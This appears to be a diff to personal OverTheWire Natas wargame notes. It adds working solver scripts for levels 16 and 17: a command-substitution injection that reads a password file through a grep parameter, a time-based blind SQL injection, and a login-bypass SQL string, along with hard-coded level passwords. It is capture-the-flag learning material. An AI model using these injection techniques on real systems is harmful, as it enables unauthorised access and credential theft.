@@ -26,6 +26,59 @@ v simple. sql injection. write username admin. pwd as ```"or '1'='1'"```. yay!<b
 ->Natas15<br>
 itta ni aata, sry. "https://medium.com/@kawsaruddin238/overthewire-natas-level-14-level-15-411de023672c"<br><br>
 ->Natas16<br>
+```
+import requests,string
+#BLIND SQL INJECTION
+#$(command) - command subsitution
+url = "http://natas16.natas.labs.overthewire.org"
+username = "natas16"
+pwd = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+
+ch = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
+password=''
+for i in range(1,34):
+    for char in ch:
+        uri = f"{url}?needle=$(grep -E ^{password}{char}.* /etc/natas_webpass/natas17)hackers"
+#grep -i "$(grep -E ^{''.join(password)}{char}.* /etc/natas_webpass/natas17)hackers" dictionary.txt
+#hackers is a unique word in dictionary. so if anything gets prepended to it through our script,
+#then it shouldn't return anything, right. so just add char to password with which nothing gets printed out.     
+        r = requests.get(uri, auth=(username,pwd))
+        if 'hackers' not in r.text:
+            #The text attribute of the response object (r)
+            password += char
+            print(password)
+            break
+        else:
+            continue
+#"https://mcpa.github.io/natas/wargame/web/overthewire/2015/10/01/natas16/"
+```
+<br><br>
+->Natas17<br>
+read: "https://owasp.org/www-community/attacks/Blind_SQL_Injection" time-based part. help taken.
+```
+import requests
+import time
+
+url = "http://natas17.natas.labs.overthewire.org/index.php"
+auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+password = ""
+
+while len(password) < 32: 
+    for char in characters:
+        payload = f'natas18" AND IF(password LIKE BINARY "{password + char}%", SLEEP(2), 0) -- '
+        start_time = time.time()
+
+        response = requests.get(url, params={"username": payload}, auth=auth)
+
+        elapsed_time = time.time() - start_time
+        if elapsed_time > 2:  # 
+            password += char
+            print(f"Current password: {password}")
+            break
+```
+<br>
+
 
 
 
